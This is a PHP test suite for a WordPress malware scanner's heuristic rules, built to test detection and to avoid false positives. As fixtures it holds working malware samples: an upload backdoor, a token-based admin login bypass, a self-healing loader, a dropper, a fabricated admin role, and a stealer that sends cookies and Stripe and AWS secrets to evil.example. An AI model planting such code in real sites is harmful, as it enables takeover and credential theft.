<?php
/**
 * Heuristic rule engine — detection and, more importantly, non-detection.
 *
 * Every sample here is reconstructed from a file actually found on a live
 * 118-account cPanel server during the October 2026 incident response, or from
 * the legitimate code that sits next to it. The clean samples are the point of
 * this file: a high or critical finding deletes a customer's file without a
 * copy by default, so a rule that fires on a Redis object cache or on
 * WordPress's own nonce checking costs more than the malware it was looking
 * for.
 *
 * The signature that shipped from this work was validated on the server
 * against 19,666 legitimate core and plugin files with zero matches. These
 * tests are the part of that which can be re-run.
 */

require_once __DIR__ . '/bootstrap.php';
require_once __DIR__ . '/assert.php';

// ── Samples: malware ────────────────────────────────────────────────────────

// Eight live copies across the server, under names like class-wp-widget.php
// and, worst of all, wp-content/advanced-cache.php. A GET returns a fake GIF
// so anything probing it sees an image.
$uploadBackdoor = <<<'PHP'
<?php
class WP_Widget_Helper {
  public function handle() {
    if (!isset($_POST["api_key"])) {
      header("Content-Type: image/gif");
      echo "\x47\x49\x46\x38\x39\x61";
      exit;
    }
    if (hash_equals("4d90637f2ba8b2c5fbb1f8a9ec6c2d41", $_POST["api_key"])) {
      move_uploaded_file($_FILES["f"]["tmp_name"], $_POST["dest"]);
    }
  }
}
PHP;

// 456 bytes, ten copies, and entirely ordinary WordPress calls. No obfuscation,
// no eval, no base64 — nothing a signature can match. It logs anyone holding
// the token straight into wp-admin.
$healthMonitor = <<<'PHP'
<?php
add_action("init", function () {
  global $wpdb;
  if (empty($_GET["_wplogin"])) return;
  $t = $_GET["_wplogin"];
  $uid = $wpdb->get_var($wpdb->prepare(
    "SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key=%s AND meta_value=%s",
    "_wpl_token", $t));
  if (!$uid) return;
  wp_set_auth_cookie($uid, true);
  wp_set_current_user($uid);
  wp_redirect(admin_url());
  exit;
}, 1);
PHP;

// One of 22 executor files for the self-healing framework, any one of which
// rebuilt the other 21. This copy lived in wp-content/db.php, a drop-in that
// loads before every plugin on every request.
$selfHealing = <<<'PHP'
<?php
$stub = get_option("wp_user_scopes_crc32");
if ($stub) {
  $code = openssl_decrypt(base64_decode($stub), "aes-256-cbc",
                          AUTH_KEY, 0, substr(SECURE_AUTH_KEY, 0, 16));
  file_put_contents(WP_CONTENT_DIR . "/mu-plugins/class-wp-locale-cache.php", $code);
}
PHP;

// 118 copies across 56 accounts, every one gone before any scheduled scan
// could have seen it.
$dropper = <<<'PHP'
<?php
require_once "wp-load.php";
$u = get_users(array("role" => "administrator", "number" => 1));
update_user_meta($u[0]->ID, "_wpl_token", "ZweH4vu_thj1BEWmOgGjau31HMXi");
echo "/?_wplogin=ZweH4vu_thj1BEWmOgGjau31HMXi";
@unlink(__FILE__);
PHP;

// 143 KB, 39 copies, dated June–July 2025 — a compromise a year older than the
// one we were called in for. It took payment-processor credentials.
$stealer = <<<'PHP'
<?php
add_action("wp_login", function ($login, $user) {
  $d = array(
    "u" => $login,
    "c" => $_COOKIE[SECURE_AUTH_COOKIE],
    "s" => get_user_meta($user->ID, "session_tokens", true),
    "k" => getenv("STRIPE_SECRET"),
    "a" => getenv("AWS_SECRET_ACCESS_KEY"),
  );
  curl_exec(curl_init("https://evil.example/c?d=" . base64_encode(serialize($d))));
}, 10, 2);
PHP;

// Registered a role carrying administrator capabilities under a name that
// reads like infrastructure. Accounts holding it were invisible to every test
// that looks for the word "administrator".
$roleInjection = <<<'PHP'
<?php
add_role("internal_cache_sync", "Cache Sync", array(
  "read" => true, "edit_users" => true, "promote_users" => true,
  "manage_options" => true, "unfiltered_upload" => true,
));
PHP;

// ── Samples: legitimate code that must NOT match ────────────────────────────

$coreNonce = <<<'PHP'
<?php
function wp_verify_nonce($nonce, $action = -1) {
  $expected = wp_create_nonce($action);
  if (hash_equals($expected, $nonce)) return 1;
  if (hash_equals("098f6bcd4621d373cade4e832627b4f6", $nonce)) return 2;
  return false;
}
PHP;

$legitUpload = <<<'PHP'
<?php
if (!current_user_can("upload_files")) wp_die("no");
check_admin_referer("media-form");
if (hash_equals("5d41402abc4b2a76b9719d911017c592", $_POST["token"])) {
  move_uploaded_file($_FILES["async-upload"]["tmp_name"], $dest);
}
PHP;

$redisCache = <<<'PHP'
<?php
// Redis Object Cache drop-in
class WP_Object_Cache {
  public function get($key, $group = "default") {
    return $this->redis->get($this->build_key($key, $group));
  }
  public function set($key, $data, $group = "default", $expire = 0) {
    return $this->redis->setex($this->build_key($key, $group), $expire,
                               serialize($data));
  }
}
PHP;

$cachePlugin = <<<'PHP'
<?php
$conf = get_option("w3tc_config");
file_put_contents(WP_CONTENT_DIR . "/cache/page.php", "<?php // cached\n" . $html);
PHP;

$ssoPlugin = <<<'PHP'
<?php
if (!wp_verify_nonce($_GET["state"], "oauth")) wp_die("bad state");
$uid = get_user_meta_by_sub($_GET["sub"]);
wp_set_auth_cookie($uid, true);
PHP;

$wooRole = <<<'PHP'
<?php
add_role("shop_manager", "Shop manager", array(
  "read" => true, "manage_woocommerce" => true, "edit_users" => true,
));
PHP;

// ── Detection ───────────────────────────────────────────────────────────────

$doc = '/home/alice/public_html';

$h = Heuristics::evaluate("$doc/wp-content/plugins/x/class-wp-widget.php", $uploadBackdoor);
t_ok($h !== null, 'the upload backdoor is detected');
t_eq('upload_backdoor_hashkey', $h['name'], 'by the hash_equals + upload combination');
t_eq('critical', $h['severity'], 'as critical');
t_contains($h['why'], 'upload', 'and the explanation says what it is');

// The point of the whole module. This file is clean code. There is nothing to
// match except the combination and the place it sits.
$h = Heuristics::evaluate("$doc/wp-content/mu-plugins/health-monitor.php", $healthMonitor);
t_ok($h !== null, 'health-monitor.php is detected despite having no signature');
t_eq('critical', $h['severity'], 'as critical — it is a password-free admin login');

// And it must still be caught if the attacker drops the usermeta lookup,
// purely because of where it is.
$h = Heuristics::evaluate("$doc/wp-content/mu-plugins/x.php",
                          '<?php wp_set_auth_cookie(1, true);');
t_eq('auth_cookie_in_dropin', $h['name'] ?? '',
     'a mu-plugin setting an auth cookie is condemned by its location alone');

$h = Heuristics::evaluate("$doc/wp-content/db.php", $selfHealing);
t_eq('self_healing_dropper', $h['name'] ?? '', 'the self-healing loader is detected');
t_eq('critical', $h['severity'] ?? '', 'as critical');

$h = Heuristics::evaluate("$doc/.hc83921.php", $dropper);
t_eq('self_deleting_script', $h['name'] ?? '', 'a self-deleting dropper is detected');

$h = Heuristics::evaluate("$doc/wp-content/plugins/z/zonal-orchestrator-io.php", $stealer);
t_ok($h !== null, 'the credential stealer is detected');
t_eq('critical', $h['severity'], 'as critical');

$h = Heuristics::evaluate("$doc/wp-content/themes/t/functions.php", $roleInjection);
t_eq('role_injection', $h['name'] ?? '', 'a fabricated privileged role is detected');

// ── Non-detection: the expensive half ───────────────────────────────────────

t_eq(null, Heuristics::evaluate("$doc/wp-includes/pluggable.php", $coreNonce),
     'WordPress nonce verification is not an upload backdoor');

t_eq(null, Heuristics::evaluate("$doc/wp-admin/async-upload.php", $legitUpload),
     'a capability-checked uploader is not a backdoor');

t_eq(null, Heuristics::evaluate("$doc/wp-content/object-cache.php", $redisCache),
     'a Redis object-cache drop-in is not a finding');

t_eq(null, Heuristics::evaluate("$doc/wp-content/plugins/w3-total-cache/w3.php", $cachePlugin),
     'a caching plugin writing generated PHP is not a dropper');

t_eq(null, Heuristics::evaluate("$doc/wp-content/plugins/oauth/login.php", $ssoPlugin),
     'a nonce-checked SSO plugin is not an auth bypass');

t_eq(null, Heuristics::evaluate("$doc/wp-content/plugins/woocommerce/inc/roles.php", $wooRole),
     "WooCommerce's shop_manager role is not an injection");

// A rule with no conditions would match every file on the server. Refused
// rather than trusted, because the consequence is deletion.
t_ok(!Heuristics::matches(['name' => 'x', 'severity' => 'critical', 'why' => ''],
                          "$doc/index.php", '<?php echo 1;'),
     'a rule with no conditions never fires');

// ── File selection ──────────────────────────────────────────────────────────

t_ok(Heuristics::shouldInspect("$doc/index.php", 100),
     'PHP is inspected');
t_ok(Heuristics::shouldInspect("$doc/wp-content/object-cache.php", 100),
     'so is a drop-in, by name');

// The stash that every scan missed: hidden, hex-named, no PHP extension.
t_ok(Heuristics::shouldInspect(
        "$doc/wp-content/uploads/.a3f9c1d4e5b6a7c8d9e0f1a2b3c4d5e6.cache", 4096),
     'and the hidden hex-named payload stash under wp-content');

t_ok(!Heuristics::shouldInspect("$doc/wp-content/uploads/2025/09/photo.jpg", 90000),
     'but an ordinary upload is not read — the sweep stays bounded');
t_ok(!Heuristics::shouldInspect("$doc/index.php", 0),
     'nor is an empty file');
t_ok(!Heuristics::shouldInspect("$doc/index.php", SCAN_MAX_SIZE + 1),
     'nor one past the size ceiling');

// Our own evidence trees are never re-judged. Re-detecting a quarantined file
// and quarantining it again produced duplicate findings on every nightly run.
t_ok(!Heuristics::shouldInspect('/home/malscan_quarantine/wplogin_1/x.php', 100),
     'quarantine and backup trees are skipped');

// ── Drop-in audit ───────────────────────────────────────────────────────────
//
// Presence is reported, not condemned: real object caches exist. What the
// operator needs to know is that the file is there at all, because it runs on
// every request including wp-login.php.

$tmp = sys_get_temp_dir() . '/sg-heur-' . getmypid();
@mkdir($tmp . '/wp-content', 0700, true);
file_put_contents($tmp . '/wp-content/object-cache.php', $redisCache);
file_put_contents($tmp . '/wp-content/db.php', $selfHealing);

$audit = Heuristics::auditDropins($tmp);
t_eq(2, count($audit), 'both drop-ins present are reported');

$by = [];
foreach ($audit as $a) $by[$a['file']] = $a;
t_eq(false, $by['object-cache.php']['suspicious'],
     'the Redis cache is listed but not flagged');
t_eq(true, $by['db.php']['suspicious'],
     'the loader in db.php is flagged');
t_contains($by['db.php']['why'], 'rebuild',
     'and says why it matters');

@unlink($tmp . '/wp-content/object-cache.php');
@unlink($tmp . '/wp-content/db.php');
@rmdir($tmp . '/wp-content');
@rmdir($tmp);

// ── Rule hygiene ────────────────────────────────────────────────────────────

$names = [];
foreach (Heuristics::rules() as $r) {
    t_ok(isset($r['name'], $r['severity'], $r['why']),
         'every rule has a name, a severity and an explanation');
    t_ok(in_array($r['severity'], ['low', 'medium', 'high', 'critical'], true),
         "rule {$r['name']} has a real severity");
    // The explanation reaches the operator in the threat list and is what they
    // decide on. A rule name is not an explanation.
    t_ok(strlen($r['why']) > 25, "rule {$r['name']} explains itself in words");
    t_ok(!isset($names[$r['name']]), "rule {$r['name']} is not a duplicate");
    $names[$r['name']] = true;

    foreach (['all', 'any', 'none'] as $k) {
        foreach ($r[$k] ?? [] as $re) {
            t_ok(@preg_match($re, '') !== false,
                 "rule {$r['name']}: $k pattern compiles");
        }
    }
    foreach (['path', 'not_path'] as $k) {
        if (isset($r[$k])) {
            t_ok(@preg_match($r[$k], '') !== false,
                 "rule {$r['name']}: $k compiles");
        }
    }
}

// ── Exclusions ──────────────────────────────────────────────────────────────
//
// FROM A LIVE SERVER. This product reported five HIGH threats against
// ai-bolit -- Imunify360's own malware scanner, shipped by CloudLinux. Every
// one was SG.RT.eval_base64, and every one was correct in the narrow sense:
// those files really do contain eval(base64_decode(...)), because a malware
// scanner carries the patterns it hunts for.
//
// A scanner that flags other scanners is not merely noisy. It teaches the
// operator that HIGH findings are usually wrong, and the next one that matters
// gets the same shrug. The signature was right and the product was still wrong.

foreach ([
    '/usr/share/ai-bolit/ai-bolit.php'          => 'the ai-bolit engine',
    '/home/x/ai-bolit/imunify_dbscan.real.php'  => 'ai-bolit wherever it sits',
    '/opt/alt/php74/usr/share/pear/x.php'       => 'CloudLinux alt-php',
    '/var/imunify360/files/x.php'               => 'Imunify360 itself',
    '/usr/local/maldetect/sigs/x.php'           => 'maldet signatures',
    '/usr/local/cpguard/x.php'                  => 'cPGuard',
    '/usr/local/cpanel/3rdparty/share/y.php'    => "cPanel's bundled code",
    '/home/malscan_quarantine/w/x.php'          => 'our own quarantine',
] as $path => $what) {
    t_ok(Heuristics::isExcluded($path), "excluded by default: $what");
    t_eq('built-in', Heuristics::excludedBy($path), "  and reported as built-in");
}

// Customer paths must NEVER be excluded by default -- that is the entire
// coverage of this product.
foreach (['/home/bgkgvs/public_html/wp-content/x.php',
          '/home/alice/public_html/index.php',
          '/home/x/public_html/wp-content/mu-plugins/health-monitor.php'] as $live) {
    t_ok(!Heuristics::isExcluded($live),
         "a customer path is NOT excluded by default: $live");
}

// ── The operator's own rules ────────────────────────────────────────────────

Database::setSetting(Heuristics::SETTING, '');
t_eq([], Heuristics::userExclusions(), 'no exclusions by default');

Heuristics::setExclusions("/home/bob/vendor
# a comment

/opt/mytool
");
t_eq(['/home/bob/vendor', '/opt/mytool'], Heuristics::userExclusions(),
     'blank lines and comments are ignored');

// A bare path is a prefix: naming a folder excludes what is under it, which is
// what an operator means by typing it.
t_ok(Heuristics::isExcluded('/home/bob/vendor/lib/x.php'),
     'a plain path excludes everything beneath it');
t_eq('/home/bob/vendor', Heuristics::excludedBy('/home/bob/vendor/lib/x.php'),
     'and the rule that did it is reported back');
t_ok(!Heuristics::isExcluded('/home/bob/vendorother/x.php'),
     'but it does not match a sibling with a longer name');
t_ok(!Heuristics::isExcluded('/home/bob/public_html/x.php'),
     'nor anything outside it');

// Globs.
Heuristics::setExclusions("/home/*/cache
/srv/**/tmp");
t_ok(Heuristics::isExcluded('/home/alice/cache/x.php'),
     '* matches one path segment');
t_ok(!Heuristics::isExcluded('/home/alice/deep/cache/x.php'),
     'and does not span a slash');
t_ok(Heuristics::isExcluded('/srv/a/b/c/tmp/x.php'),
     '** spans slashes');

// THE DANGEROUS INPUT. "/" or "*" alone would exclude the entire filesystem
// and silently turn scanning off, with the panel still reporting "Protected".
foreach (['/', '*', '/*', '**'] as $kill) {
    Heuristics::setExclusions($kill);
    t_eq([], Heuristics::userExclusions(),
         "\"$kill\" is refused — it would switch scanning off entirely");
    t_ok(!Heuristics::isExcluded('/home/alice/public_html/index.php'),
         "  and a customer file is still scanned");
}

// Adding one at a time, from a threat row.
Database::setSetting(Heuristics::SETTING, '');
Heuristics::addExclusion('/opt/thing');
Heuristics::addExclusion('/opt/thing');
t_eq(['/opt/thing'], Heuristics::userExclusions(), 'adding twice stores one');
Heuristics::addExclusion('/');
t_eq(['/opt/thing'], Heuristics::userExclusions(),
     'and "/" cannot be added that way either');
Database::setSetting(Heuristics::SETTING, '');

// shouldInspect() must honour exclusions, or the rules are decorative.
Heuristics::setExclusions('/home/zed/skipme');
t_ok(!Heuristics::shouldInspect('/home/zed/skipme/evil.php', 100),
     'an excluded file is never even read');
t_ok(Heuristics::shouldInspect('/home/zed/other/evil.php', 100),
     'while the rest of the account still is');
Database::setSetting(Heuristics::SETTING, '');

// ── Both engines must agree ────────────────────────────────────────────────
//
// The ai-bolit findings came from the real-time daemon, not the scanner. If
// only one side excluded them, a file would be quarantined in real time and
// then declared clean by the next scheduled scan.

$daemon = (string)file_get_contents(dirname(__DIR__) . '/backend/daemon/monitor.py');
foreach (['ai-bolit', 'imunify360', '/opt/alt/', 'maldetect', 'cpguard'] as $tool) {
    t_contains($daemon, $tool,
         "the real-time daemon skips $tool too — these detections came from it");
}
t_contains($daemon, 'scan_exclusions',
     'and the daemon reads the same operator setting as the scanner');

// ── The exclude controls must actually be wired ─────────────────────────────
//
// The first version of the per-row button rendered
//   onclick="excludeThreatPath(${JSON.stringify(t.file_path || '')})"
// JSON.stringify emits DOUBLE quotes, which terminate a double-quoted HTML
// attribute. The browser saw  onclick="excludeThreatPath("  and never bound a
// handler, so the button did nothing at all when clicked.
//
// Every check at the time passed. The function existed, brackets balanced, and
// the test asserted the name appeared in app.js. None of that is evidence the
// control works, which is the lesson: assert the SHAPE of what is rendered,
// not that an identifier is present somewhere in the file.

$appJs = (string)file_get_contents(dirname(__DIR__) . '/frontend/js/app.js');
$htmlF = (string)file_get_contents(dirname(__DIR__) . '/frontend/index.html');

t_contains($appJs, 'onclick="excludeThreatPath(${id})"',
     'the per-row exclude button passes the numeric id');
t_ok(strpos($appJs, 'excludeThreatPath(${JSON.stringify') === false,
     'and never interpolates a path into the attribute — that is what broke it');

// No event attribute anywhere may carry a path. A path can contain an
// apostrophe, a space or a backslash; single quotes do not save it either.
t_ok(preg_match('/on[a-z]+="[^"]*\$\{[^}]*(?:file_path|filepath)[^}]*\}/i', $appJs) === 0,
     'no event attribute interpolates a file path at all');

// The path is resolved from state instead.
t_contains($appJs, 'State.threatPaths',
     'paths are looked up from state, keyed by id');
t_contains($appJs, 'State.threatPaths = {}',
     'and the map is rebuilt whenever the table is rendered');

// Bulk. Five findings from one vendor tree is the normal case — that is
// exactly what ai-bolit produced — so one-at-a-time prompting is the wrong
// shape of work.
t_contains($htmlF, 'onclick="excludeSelectedThreats()"',
     'there is a bulk exclude button');
t_contains($htmlF, 'id="threat-bulk-exclude"', 'with an id');
t_contains($htmlF, 'threat-bulk-btn" id="threat-bulk-exclude"',
     'carrying the class the bulk bar enables and disables');
t_contains($appJs, 'async function excludeSelectedThreats',
     'and a handler behind it');
t_contains($appJs, 'selectedThreatIds()',
     'which uses the same selection the other bulk actions use');

// Several files in one folder must collapse to ONE rule, or the exclusion list
// becomes its own unreadable mess within a week.
t_contains($appJs, 'new Set(',
     'bulk exclusion de-duplicates to parent folders');
